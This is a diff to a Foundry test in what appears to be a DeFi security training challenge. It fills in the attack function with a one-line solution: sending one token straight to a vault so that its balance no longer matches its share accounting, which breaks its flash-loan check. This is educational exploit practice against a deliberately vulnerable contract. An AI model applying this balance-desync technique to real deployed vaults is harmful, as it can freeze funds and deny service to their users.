@@ -88,11 +88,10 @@ contract UnstoppableChallenge is Test {
     }
 
     ////////////////////////////////////////////////////////////////////////
-    // Write your attack here — this is the only function you need to change
+    // Ex7: break the flash-loan balance check
     ////////////////////////////////////////////////////////////////////////
     function test_unstoppable() public checkSolvedByPlayer {
-        // Hint: you are holding 10 DVT. What assumption does the vault make about its own balance?
-        //
+        // A direct donation raises the asset balance without minting vault shares.
         token.transfer(address(vault), 1);
     }
 
